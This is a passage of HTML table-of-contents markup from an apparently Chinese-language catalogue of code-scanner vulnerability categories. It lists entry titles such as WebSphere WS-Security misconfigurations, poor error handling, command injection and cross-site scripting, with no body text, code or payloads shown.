class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-231"><span class="toc-number">1.4.91.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-230"><span class="toc-number">1.4.91.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.92.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-232"><span class="toc-number">1.4.92.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-233"><span class="toc-number">1.4.92.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-232"><span class="toc-number">1.4.92.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-231"><span class="toc-number">1.4.92.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.93.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-233"><span class="toc-number">1.4.93.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-234"><span class="toc-number">1.4.93.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-233"><span class="toc-number">1.4.93.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-232"><span class="toc-number">1.4.93.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.94.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-234"><span class="toc-number">1.4.94.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-235"><span class="toc-number">1.4.94.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-234"><span class="toc-number">1.4.94.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-233"><span class="toc-number">1.4.94.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.95.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-235"><span class="toc-number">1.4.95.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-236"><span class="toc-number">1.4.95.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-235"><span class="toc-number">1.4.95.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-234"><span class="toc-number">1.4.95.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Timestamp-Expiration"><span class="toc-number">1.4.96.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Timestamp Expiration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-236"><span class="toc-number">1.4.96.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-237"><span class="toc-number">1.4.96.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-236"><span class="toc-number">1.4.96.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-235"><span class="toc-number">1.4.96.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.97.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-237"><span class="toc-number">1.4.97.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-238"><span class="toc-number">1.4.97.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-237"><span class="toc-number">1.4.97.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-236"><span class="toc-number">1.4.97.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.98.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-238"><span class="toc-number">1.4.98.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-239"><span class="toc-number">1.4.98.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-238"><span class="toc-number">1.4.98.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-237"><span class="toc-number">1.4.98.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.99.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-239"><span class="toc-number">1.4.99.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-240"><span class="toc-number">1.4.99.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-239"><span class="toc-number">1.4.99.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-238"><span class="toc-number">1.4.99.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.100.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-240"><span class="toc-number">1.4.100.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-241"><span class="toc-number">1.4.100.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-240"><span class="toc-number">1.4.100.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-239"><span class="toc-number">1.4.100.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weblogic-Misconfiguration-Missing-Timestamp"><span class="toc-number">1.4.101.</span> <span class="toc-text">Weblogic Misconfiguration: Missing Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-241"><span class="toc-number">1.4.101.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-242"><span class="toc-number">1.4.101.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-241"><span class="toc-number">1.4.101.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-240"><span class="toc-number">1.4.101.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weblogic-Misconfiguration-Weak-Token"><span class="toc-number">1.4.102.</span> <span class="toc-text">Weblogic Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-242"><span class="toc-number">1.4.102.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-243"><span class="toc-number">1.4.102.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-242"><span class="toc-number">1.4.102.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-241"><span class="toc-number">1.4.102.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异常处理"><span class="toc-number">1.5.</span> <span class="toc-text">异常处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Empty-Catch-Block"><span class="toc-number">1.5.1.</span> <span class="toc-text">Poor Error Handling: Empty Catch Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-243"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-244"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-243"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-242"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Overly-Broad-Catch"><span class="toc-number">1.5.2.</span> <span class="toc-text">Poor Error Handling: Overly Broad Catch</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-244"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-245"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-244"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-243"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Overly-Broad-Throws"><span class="toc-number">1.5.3.</span> <span class="toc-text">Poor Error Handling: Overly Broad Throws</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-245"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-246"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-245"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-244"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Program-Catches-NullPointerException"><span class="toc-number">1.5.4.</span> <span class="toc-text">Poor Error Handling: Program Catches NullPointerException</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-246"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-247"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-246"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-245"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Return-Inside-Finally"><span class="toc-number">1.5.5.</span> <span class="toc-text">Poor Error Handling: Return Inside Finally</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-247"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-248"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-247"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-246"><span class="toc-number">1.5.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Swallowed-ThreadDeath"><span class="toc-number">1.5.6.</span> <span class="toc-text">Poor Error Handling: Swallowed ThreadDeath</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-248"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-249"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-248"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-247"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Throw-Inside-Finally"><span class="toc-number">1.5.7.</span> <span class="toc-text">Poor Error Handling: Throw Inside Finally</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-249"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-250"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-249"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-248"><span class="toc-number">1.5.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Unhandled-SSL-Exception"><span class="toc-number">1.5.8.</span> <span class="toc-text">Poor Error Handling: Unhandled SSL Exception</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-250"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-251"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-250"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-249"><span class="toc-number">1.5.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入验证与展示问题"><span class="toc-number">1.6.</span> <span class="toc-text">输入验证与展示问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Missing-URL-Parameter-Converter"><span class="toc-number">1.6.1.</span> <span class="toc-text">ADF Bad Practices: Missing URL Parameter Converter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-251"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-252"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-251"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-250"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Specifier-Manipulation"><span class="toc-number">1.6.2.</span> <span class="toc-text">Access Specifier Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-252"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-253"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-252"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-251"><span class="toc-number">1.6.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Class-Loading-Hijacking"><span class="toc-number">1.6.3.</span> <span class="toc-text">Android Class Loading Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-253"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-254"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-253"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-252"><span class="toc-number">1.6.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bean-Manipulation"><span class="toc-number">1.6.4.</span> <span class="toc-text">Bean Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-254"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-255"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-254"><span class="toc-number">1.6.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-253"><span class="toc-number">1.6.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.6.5.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-255"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-256"><span class="toc-number">1.6.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-255"><span class="toc-number">1.6.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-254"><span class="toc-number">1.6.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Content-Provider-URI-Injection"><span class="toc-number">1.6.6.</span> <span class="toc-text">Content Provider URI Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-256"><span class="toc-number">1.6.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-257"><span class="toc-number">1.6.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-256"><span class="toc-number">1.6.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-255"><span class="toc-number">1.6.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-DOM"><span class="toc-number">1.6.7.</span> <span class="toc-text">Cross-Site Scripting: DOM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-257"><span class="toc-number">1.6.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-258"><span class="toc-number">1.6.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-257"><span class="toc-number">1.6.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-256"><span class="toc-number">1.6.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-External-Links"><span class="toc-number">1.6.8.</span> <span class="toc-text">Cross-Site Scripting: External Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-258"><span class="toc-number">1.6.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-259"><span class="toc-number">1.6.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-258"><span class="toc-number">1.6.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-257"><span class="toc-number">1.6.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Inter-Component-Communication"><span class="toc-number">1.6.9.</span> <span class="toc-text">Cross-Site Scripting: Inter-Component Communication</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-259"><span class="toc-number">1.6.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-260"><span class="toc-number">1.6.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-259"><span class="toc-number">1.6.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-258"><span class="toc-number">1.6.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Persistent"><span class="toc-number">1.6.10.</span> <span class="toc-text">Cross-Site Scripting: Persistent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-260"><span class="toc-number">1.6.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-261"><span class="toc-number">1.6.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-260"><span class="toc-number">1.6.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-259"><span class="toc-number">1.6.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation"><span class="toc-number">1.6.11.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-261"><span class="toc-number">1.6.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-262"><span class="toc-number">1.6.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-261"><span class="toc-number">1.6.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-260"><span class="toc-number">1.6.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation-1"><span class="toc-number">1.6.12.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-262"><span class="toc-number">1.6.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-263"><span class="toc-number">1.6.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-262"><span class="toc-number">1.6.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-261"><span class="toc-number">1.6.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-File-Inclusion"><span class="toc-number">1.6.13.</span> <span class="toc-text">Dangerous File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-263"><span class="toc-number">1.6.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-264"><span class="toc-number">1.6.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-263"><span class="toc-number">1.6.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-262"><span class="toc-number">1.6.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service"><span class="toc-number">1.6.14.</span> <span class="toc-text">Denial of Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-264"><span class="toc-number">1.6.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-265"><span class="toc-number">1.6.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-264"><span class="toc-number">1.6.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-263"><span class="toc-number">1.6.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Format-String"><span class="toc-number">1.6.15.</span> <span class="toc-text">Denial of Service: Format String</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-265"><span class="toc-number">1.6.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item 